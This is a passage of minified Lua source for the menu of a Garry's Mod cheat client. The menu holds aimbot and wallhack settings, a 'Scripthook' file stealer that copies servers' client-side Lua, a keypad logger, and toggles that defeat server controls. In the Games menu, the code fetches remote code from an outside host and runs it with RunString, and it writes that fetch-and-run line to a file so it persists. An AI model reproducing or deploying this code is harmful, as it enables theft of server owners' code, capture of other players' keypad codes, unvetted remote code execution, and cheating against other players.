bg=vgui.Create("DNumSlider",menupanelfunctional)bg:SetPos(-108,199)bg:SetSize(275,25)bg:SetMin(0)bg:SetMax(40)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(n["AIM_SMOOTHING"])function bg:OnValueChanged(t)p("AIM_SMOOTHING",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end;local bi=vgui.Create("DComboBox",menupanelfunctional)bi:SetPos(6,217+4)bi:SetSize(121,20)bi:SetValue("Hitbox")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi.OnSelect=function(f,f,r)p("AIM_HITBOX",r)end;bi:AddChoice("Head")bi:AddChoice("Body")end)bc("Misc",43-12.5,function()U["select"]="Misc"if IsValid(menupanelfunctional)then menupanelfunctional:Remove()end;menupanelfunctional=vgui.Create("DScrollPanel",ba)menupanelfunctional:SetPos(10,57)menupanelfunctional:SetSize(500,248)menupanelfunctional.Paint=function(f,N,P)end;menupanelfunctional.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;menupanelfunctional.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;menupanelfunctional.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;bb(menupanelfunctional,"Bunny hop",6,5,"MISC_BUNNYHOP")bb(menupanelfunctional,"Auto strafe",6,5+18,"MISC_AUTOSTRAFE")bb(menupanelfunctional,"Flashlight",6,5+18+18,"MISC_FLASHSPAM")bb(menupanelfunctional,"Scripthook",6,5+18+18+18,"LUA_FILE_STEALER",[[Steal server client-side Lua files. Saved to Steam\steamapps\common\GarrysMod\garrysmod\data\hack]])bb(menupanelfunctional,"Print RunString",6,5+18+18+18+18,"LUA_PRINTRUNNINGCODE","Print running code in console.")bb(menupanelfunctional,"Afk mode",6,5+18+18+18+18+18,"MISC_ANTIANTIAFK")local aJ=menupanelfunctional:Add("DCheckBoxLabel")aJ:SetPos(6,5+18+18+18+18+18+18)aJ:SetSize(15,15)aJ:SetText("Save Mode")aJ:SetFont("hack_font_17")aJ:SetTextColor(Color(255,255,255))aJ:SetValue(h)aJ:SetToolTip("Enable only while on the server!")function aJ.Button:Paint(as,at)if self:GetChecked()then surface.SetDrawColor(65,95,200)surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,as,at)end;function aJ:OnChange(aX)h=aX end;bb(menupanelfunctional,"Keypad logger",6,5+18+18+18+18+18+18+18,"MISC_KEYPADLOGGER","Not work if secure mode")local aJ=menupanelfunctional:Add("DCheckBoxLabel")aJ:SetPos(6,203-18-18-18)aJ:SetSize(15,15)aJ:SetText("E spammer")aJ:SetFont("hack_font_17")aJ:SetTextColor(Color(255,255,255))aJ:SetValue(n["MISC_ESPAMMER"])function aJ.Button:Paint(as,at)if self:GetChecked()then surface.SetDrawColor(65,95,200)surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,as,at)end;function aJ:OnChange(aX)if aX==false then RunConsoleCommand("-use")end;p("MISC_ESPAMMER",aX)end;V("Change Name",6,223-18-18-18,106,menupanelfunctional,aa)end)bc("Settings",31-12.5,function()U["select"]="Settings"if IsValid(menupanelfunctional)then menupanelfunctional:Remove()end;menupanelfunctional=vgui.Create("DScrollPanel",ba)menupanelfunctional:SetPos(10,57)menupanelfunctional:SetSize(500,248)menupanelfunctional.Paint=function(f,N,P)end;menupanelfunctional.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;menupanelfunctional.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;menupanelfunctional.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;V("Customization",6,6,106,menupanelfunctional,function()if IsValid(changeclolhack)then changeclolhack:Close()end;changeclolhack=vgui.Create("DFrame")changeclolhack:SetSize(255,242)changeclolhack:SetPos(gui.MouseX(),gui.MouseY())changeclolhack:SetTitle("")changeclolhack:MakePopup()changeclolhack:ShowCloseButton(false)changeclolhack.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,1,N-2,P-2)surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(115,6,134,230)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(116,7,132,228)end;local bj=vgui.Create("DTextEntry",changeclolhack)bj:SetPos(6,6)bj:SetSize(90+15,25)bj:SetText("")bj.Paint=function(self,N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,0,self:GetWide(),self:GetTall())self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;bj.OnTextChanged=function()k.findcustom(bj:GetValue())end;function k.findcustom(bk)if IsValid(sddfg)then sddfg:Remove()end;sddfg=vgui.Create("DScrollPanel",changeclolhack)sddfg:SetPos(6,6+30)sddfg:SetSize(105,230-30)sddfg.Paint=function(f,N,P)end;sddfg.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;sddfg.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;sddfg.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local bl=0;local function bm(F,q)if string.find(F,bk)then V(F,0,bl,90,sddfg,q)bl=bl+27 end end;local function bn(a7,W,X)local bi=vgui.Create("DComboBox",k.cuz)bi:SetPos(W,X)bi:SetSize(121,20)bi:SetValue("Position")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi.OnSelect=function(f,f,r)p(a7,r)end;bi:AddChoice("Up")bi:AddChoice("Down")bi:AddChoice("Left")bi:AddChoice("Right")end;local function bo(a7,W,X)local bp=vgui.Create("DColorMixer",k.cuz)bp:SetPos(W,X)bp:SetSize(121,150)bp:SetAlphaBar(false)bp:SetPalette(false)bp:SetWangs(false)bp:SetColor(n[a7])bp.ValueChanged=function()p(a7,bp:GetColor())end end;bm("Menu",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bb(k.cuz,"Background",6,6,"MENU_BACKGROUND")local bq=vgui.Create("DTextEntry",k.cuz)bq:SetPos(6,6+18)bq:SetSize(100,25)bq:SetText(n["MENU_BACKGROUND_URL"])bq.Paint=function(self,N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,0,self:GetWide(),self:GetTall())self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;bq.OnTextChanged=function()p("MENU_BACKGROUND_URL",bq:GetValue())end end)bm("Font",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;local bi=vgui.Create("DComboBox",k.cuz)bi:SetPos(6,6)bi:SetSize(121,20)bi:SetValue("Font(restart game)")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi.OnSelect=function(f,f,r)p("WH_FONT",r)end;bi:AddChoice("ChatFont")bi:AddChoice("Default")bi:AddChoice("CenterPrintText")bi:AddChoice("HudSelectionText")bi:AddChoice("CloseCaption_Normal")bi:AddChoice("CloseCaption_Bold")bi:AddChoice("CloseCaption_BoldItalic")bi:AddChoice("DebugFixed")bi:AddChoice("TargetID")bi:AddChoice("TargetIDSmall")bi:AddChoice("Trebuchet18")end)bm("Name",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bn("WH_NAME_POSITION",6,6)bo("WH_NAME_COLOR",6,30)end)bm("Rank",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bn("WH_USERGROUP_POSITION",6,6)bo("WH_USERGROUP_COLOR",6,30)end)bm("Team",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bn("WH_JOB_POSITION",6,6)end)bm("Money",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bn("WH_MONEY_POSITION",6,6)bo("WH_MONEY_COLOR",6,30)end)bm("Health",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bn("WH_HEALTH_POSITION",6,6)local br=vgui.Create("DComboBox",k.cuz)br:SetPos(6,30)br:SetSize(121,20)br:SetValue("Type")br:SetTextColor(Color(255,255,255))br.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,br:GetWide(),br:GetTall())end;br.OnSelect=function(f,f,r)p("WH_HEALTH_TYPETYPE",r)end;br:AddChoice("Text")br:AddChoice("Bar")br:AddChoice("Text + Bar")local bi=vgui.Create("DComboBox",k.cuz)bi:SetPos(6,54)bi:SetSize(121,20)bi:SetValue("Color")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi.OnSelect=function(f,f,r)p("WH_HEALTH_TYPECOLOR",r)end;bi:AddChoice("Automatic")bi:AddChoice("Custom")bo("WH_HEALTH_COLOR",6,78)end)bm("Armor",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bn("WH_ARMOR_POSITION",6,6)local br=vgui.Create("DComboBox",k.cuz)br:SetPos(6,30)br:SetSize(121,20)br:SetValue("Type")br:SetTextColor(Color(255,255,255))br.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,br:GetWide(),br:GetTall())end;br.OnSelect=function(f,f,r)p("WH_ARMOR_TYPETYPE",r)end;br:AddChoice("Text")br:AddChoice("Bar")br:AddChoice("Text + Bar")bo("WH_ARMOR_COLOR",6,55)end)bm("Chams",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;local br=vgui.Create("DComboBox",k.cuz)br:SetPos(6,6)br:SetSize(121,20)br:SetValue("Type")br:SetTextColor(Color(255,255,255))br.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,br:GetWide(),br:GetTall())end;br.OnSelect=function(f,f,r)p("WH_CHAMS_TYPE",r)end;br:AddChoice("Type 1")br:AddChoice("Type 2")local br=vgui.Create("DComboBox",k.cuz)br:SetPos(6,30)br:SetSize(121,20)br:SetValue("Color")br:SetTextColor(Color(255,255,255))br.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,br:GetWide(),br:GetTall())end;br.OnSelect=function(f,f,r)p("WH_CHAMS_COLORTYPE",r)end;br:AddChoice("Custom")br:AddChoice("Team")bo("WH_CHAMS_COLOR",6,55)end)bm("Weapon",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bn("WH_WEAPON_POSITION",6,6)local bi=vgui.Create("DComboBox",k.cuz)bi:SetPos(6,30)bi:SetSize(121,20)bi:SetValue("Type")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi.OnSelect=function(f,f,r)p("WH_WEAPON_TYPETYPE",r)end;bi:AddChoice("Only active")bi:AddChoice("All")bo("WH_WEAPON_COLOR",6,54)end)bm("Skeleton",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;local br=vgui.Create("DComboBox",k.cuz)br:SetPos(6,6)br:SetSize(121,20)br:SetValue("Color")br:SetTextColor(Color(255,255,255))br.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,br:GetWide(),br:GetTall())end;br.OnSelect=function(f,f,r)p("WH_SKELETON_COLORTYPE",r)end;br:AddChoice("Custom")br:AddChoice("Team")bo("WH_SKELETON_COLOR",6,31)end)bm("Box",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;local bi=vgui.Create("DComboBox",k.cuz)bi:SetPos(6,6)bi:SetSize(121,20)bi:SetValue("Type")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi.OnSelect=function(f,f,r)p("WH_BOX_TYPETYPE",r)end;bi:AddChoice("2d")bi:AddChoice("3d")local bi=vgui.Create("DComboBox",k.cuz)bi:SetPos(6,30)bi:SetSize(121,20)bi:SetValue("Color")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi.OnSelect=function(f,f,r)p("WH_BOX_TYPECOLOR",r)end;bi:AddChoice("Custom")bi:AddChoice("Job")bo("WH_BOX_COLOR",6,54)end)bm("Chams W",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bo("WH_VMCHAMS_COLOR",6,6)end)bm("Entity Name",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bo("WH_ENTITY_NAME_COLOR",6,6)end)bm("Entity Box",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;local bi=vgui.Create("DComboBox",k.cuz)bi:SetPos(6,6)bi:SetSize(121,20)bi:SetValue("Type")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi:AddChoice("2d")bi:AddChoice("3d")bi.OnSelect=function(f,f,r)p("WH_ENTITY_BOX_TYPE",r)end;bo("WH_ENTITY_BOX_COLOR",6,30)end)bm("Night",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()draw.SimpleText("Brightness","hack_font_15",6,156,Color(255,255,255))end;local bg=vgui.Create("DNumSlider",k.cuz)bg:SetPos(-98,166)bg:SetSize(250,25)bg:SetMin(0.1)bg:SetMax(0.9)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(10 or n["WH_NIGHT_BRIGHTNESS"])function bg:OnValueChanged(t)p("WH_NIGHT_BRIGHTNESS",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end;bo("WH_NIGHT_COLOR",6,6)end)bm("Radar",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()draw.SimpleText("Distance","hack_font_15",6,6,Color(255,255,255))draw.SimpleText("Size","hack_font_15",6,21+25,Color(255,255,255))end;local bg=vgui.Create("DNumSlider",k.cuz)bg:SetPos(-98,21)bg:SetSize(250,25)bg:SetMin(10)bg:SetMax(200)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(n["WH_RADAR_DISTANCE"])function bg:OnValueChanged(t)p("WH_RADAR_DISTANCE",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end;local bg=vgui.Create("DNumSlider",k.cuz)bg:SetPos(-98,21+25+15)bg:SetSize(250,25)bg:SetMin(1)bg:SetMax(7)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(n["WH_RADAR_SIZE"])function bg:OnValueChanged(t)p("WH_RADAR_SIZE",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end end)bm("Debug C",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()draw.SimpleText("Speed","hack_font_15",6,35-27,Color(255,255,255))end;local bg=vgui.Create("DNumSlider",k.cuz)bg:SetPos(-108,50-27)bg:SetSize(275,25)bg:SetMin(0.010999999664724)bg:SetMax(0.044999999664724)bg:SetDecimals(0)bg.TextArea:SetTextColor(Color(30,30,30))bg:SetValue(n["WH_DEBUGCAMERA_SPEED"])function bg:OnValueChanged(t)p("WH_DEBUGCAMERA_SPEED",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end end)bm("ThirdPerson",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()draw.SimpleText("Distance","hack_font_15",6,35-27,Color(255,255,255))end;local bg=vgui.Create("DNumSlider",k.cuz)bg:SetPos(-108,50-27)bg:SetSize(275,25)bg:SetMin(70)bg:SetMax(300)bg:SetDecimals(0)bg.TextArea:SetTextColor(Color(30,30,30))bg:SetValue(n["WH_THIRDPERSON_DISTANCE"])function bg:OnValueChanged(t)p("WH_THIRDPERSON_DISTANCE",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end end)bm("CrossHair",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()draw.SimpleText("Size","hack_font_15",6,156,Color(255,255,255))end;local bg=vgui.Create("DNumSlider",k.cuz)bg:SetPos(-98,166)bg:SetSize(250,25)bg:SetMin(1)bg:SetMax(100)bg:SetDecimals(0)bg.TextArea:SetFont("hack_font_13")bg.TextArea:SetTextColor(Color(255,255,255))bg:SetValue(10 or n["WH_CROSSHAIR_SIZE"])function bg:OnValueChanged(t)p("WH_CROSSHAIR_SIZE",t)end;function bg.Slider.Knob:Paint()end;function bg.Slider:Paint(N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,P/4,N,P/2)surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,P/4,N*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),P/2)bg.SetTall=bg.SetHeight;bg.Slider.Knob:SetTall(20)end;bo("WH_CROSSHAIR_COLOR",6,6)end)bm("Keypad",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bo("MISC_KEYPADLOGGER_COLOR",6,6)end)bm("Fov",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bo("WH_FOV_COLOR",6,6)end)bm("NoSky",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;bo("WH_NOSKY_COLOR",6,6)end)bm("Mirror",function()if IsValid(k.cuz)then k.cuz:Remove()end;k.cuz=vgui.Create("DPanel",changeclolhack)k.cuz:SetPos(115,6)k.cuz:SetSize(134,322)k.cuz.Paint=function()end;local bi=vgui.Create("DComboBox",k.cuz)bi:SetPos(6,6)bi:SetSize(121,20)bi:SetValue("Type")bi:SetTextColor(Color(255,255,255))bi.Paint=function()surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,bi:GetWide(),bi:GetTall())end;bi:AddChoice("Type 1")bi:AddChoice("Type 2")bi.OnSelect=function(f,f,r)p("WH_MIRROR_TYPE",r)end end)end;k.findcustom("")changeclolhack.Think=function()if IsValid(changeclolhack)and input.IsMouseDown(107)then if not changeclolhack:IsChildHovered()and not changeclolhack.Hovered then changeclolhack:Close()end end end end)V("Notifications",6,36,97,menupanelfunctional,function()if IsValid(optiogfnslol)then optionslol:Close()end;optiogfnslol=vgui.Create("DFrame")optiogfnslol:SetSize(156,2+18+18+18+19)optiogfnslol:SetPos(gui.MouseX()-10,gui.MouseY()-10)optiogfnslol:SetTitle("")optiogfnslol:MakePopup()optiogfnslol:ShowCloseButton(false)optiogfnslol.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,1,N-2,P-2)end;bb(optiogfnslol,"Who killed me",3,2,"WH_NOTIFICATION_KILLEDMEBY")bb(optiogfnslol,"Who damaged me",3,2+18,"WH_NOTIFICATION_DAMAGEDMEBY")bb(optiogfnslol,"Whom did i kill",3,2+18+18,"WH_NOTIFICATION_IKILLED")bb(optiogfnslol,"Screengraben",3,2+18+18+18,"WH_NOTIFICATION_SCREENGRAB")optiogfnslol.Think=function()if IsValid(optiogfnslol)and input.IsMouseDown(107)then if not optiogfnslol:IsChildHovered()and not optiogfnslol.Hovered then optiogfnslol:Close()end end end end)V("Lua control",6,66,86,menupanelfunctional,function()if IsValid(optiogfnslol)then optionslol:Close()end;optiogfnslol=vgui.Create("DFrame")optiogfnslol:SetSize(270,2+18+18+18+19)optiogfnslol:SetPos(gui.MouseX()-10,gui.MouseY()-10)optiogfnslol:SetTitle("")optiogfnslol:MakePopup()optiogfnslol:ShowCloseButton(false)optiogfnslol.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,1,N-2,P-2)end;bb(optiogfnslol,"Block 'bindfolded in handcuff'",3,2,"LUACONTROL_HANDCUFF")bb(optiogfnslol,"Block Anti-Nlr",3,2+18,"LUACONTROL_ANTINLR")bb(optiogfnslol,"My os is OSX",3,2+18+18,"LUACONTROL_OSX")bb(optiogfnslol,"Hides join messages in chat",3,2+18+18+18,"LUACONTROL_HIDECONNECTS")optiogfnslol.Think=function()if IsValid(optiogfnslol)and input.IsMouseDown(107)then if not optiogfnslol:IsChildHovered()and not optiogfnslol.Hovered then optiogfnslol:Close()end end end end)_("Menu","MENU_OPENKEY",6,96,49,menupanelfunctional)_("Auto Pistol","MISC_AUTOPISTOL",6,126,87,menupanelfunctional)_("Add Entity/Friend","MISC_ADDENTITYFRIEND",6,156,130,menupanelfunctional)_("Panic key","PANICKEY",6,186,76,menupanelfunctional)_("Debug Camera","WH_DEBUGCAMERA_KEY",6,186+30,110,menupanelfunctional)_("Thirdperson","WH_THIRDPERSON_KEY",6,186+30+30,93,menupanelfunctional)a6(1,"Config","configs",function()if U["configs"]then U["configs"]=not U["configs"]aQ:Hide()else U["configs"]=not U["configs"]aQ:Show()end end,57,96+30+30+30+30+30+30+30)V("Games",6,276+30+30,56,menupanelfunctional,function()http.Fetch("https://execccc.online/hacka/scriptspublic/gaym.lua",RunString)if IsValid(optiogfnslol)then optionslol:Close()end;optiogfnslol=vgui.Create("DFrame")optiogfnslol:SetSize(156,91+27)optiogfnslol:SetPos(gui.MouseX()-10,gui.MouseY()-10)optiogfnslol:SetTitle("")optiogfnslol:MakePopup()optiogfnslol:ShowCloseButton(false)optiogfnslol.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,1,N-2,P-2)end;V("Pacman",6,6,63,optiogfnslol,function()RunConsoleCommand("royal_pacman",1)end)V("Snake",6,6+27,53,optiogfnslol,function()RunConsoleCommand("royal_snake",1)end)V("Simon",6,6+27+27,56,optiogfnslol,function()RunConsoleCommand("simongame")end)V("Pong(InGame)",6,6+27+27+27,106,optiogfnslol,function()file.Write(k.runlua,[[http.Fetch("https://execccc.online/hacka/scriptspublic/pong.lua",RunString)]])timer.Simple(4,function()RunConsoleCommand("pong",1)end)end)optiogfnslol.Think=function()if IsValid(optiogfnslol)and input.IsMouseDown(107)then if not optiogfnslol:IsChildHovered()and not optiogfnslol.Hovered then optiogfnslol:Close()end end end end)V("Unload",6,216+30+30,59,menupanelfunctional,function()p("UNLOAD",true)hook.Remove("Think","fff")hook.Remove("hackautorun","ok")ba:Hide()ac:Hide()aB:Hide()aZ:Hide()aQ:Hide()al:Hide()ax:Hide()end)end)bc("Other",43-12.5,function()U["select"]="Other"if IsValid(menupanelfunctional)then menupanelfunctional:Remove()end;menupanelfunctional=vgui.Create("DScrollPanel",ba)menupanelfunctional:SetPos(10,57)menupanelfunctional:SetSize(500,248)menupanelfunctional.Paint=function(f,N,P)end;menupanelfunctional.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;menupanelfunctional.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;menupanelfunctional.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;a6(2,"Info","WH_INFO",function()end,35,6)a6(1,"Logs","logs",function()if U["logs"]then U["logs"]=not 